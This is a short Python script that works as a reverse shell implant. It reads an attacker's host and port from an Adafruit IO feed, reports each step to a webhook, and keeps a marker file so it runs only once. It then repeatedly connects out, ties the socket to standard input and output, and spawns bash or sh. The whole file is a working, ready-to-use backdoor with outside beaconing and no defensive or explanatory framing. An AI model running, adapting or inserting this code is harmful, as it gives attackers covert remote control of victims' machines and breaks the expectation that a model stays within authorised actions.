import os
import pty
import time
import socket
import requests

DELAY = 10

LOG = os.path.expanduser("~/.log")

URL_POST = "https://io.adafruit.com/api/v2/webhooks/feed/VDTwYfHtVeSmB1GkJjcoqS62sYJu"
URL_GET = "https://io.adafruit.com/api/v2/naxa/feeds/host-port"


def log(message):
    with open(LOG, "a") as f:
        f.write(message + "\n")

    requests.post(
        URL_POST,
        data={"value": message},
    )


def main():
    if os.path.exists(LOG):
        requests.post(
            URL_POST,
            data={"value": "skip"},
        )
        return

    log("start")

    address = tuple(requests.get(URL_GET).json()["last_value"].split(":"))
    log(f"address: {address}")

    while True:
        log("loop")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(address)

                log("connect")

                for fd in (0, 1, 2):
                    os.dup2(s.fileno(), fd)

                try:
                    pty.spawn("bash")

                except:
                    pty.spawn("sh")

                log("disconnect")

                time.sleep(DELAY * 6)

        except:
            time.sleep(DELAY)


if __name__ == "__main__":
    main()
